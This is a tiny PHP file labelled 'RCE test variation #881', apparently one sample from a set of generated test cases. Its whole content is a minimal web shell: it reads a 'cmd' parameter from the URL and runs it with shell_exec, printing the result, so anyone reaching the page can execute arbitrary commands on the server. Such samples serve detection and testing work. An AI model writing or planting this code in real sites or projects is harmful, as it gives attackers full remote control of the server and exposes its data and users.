<?php
// RCE test variation #881
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>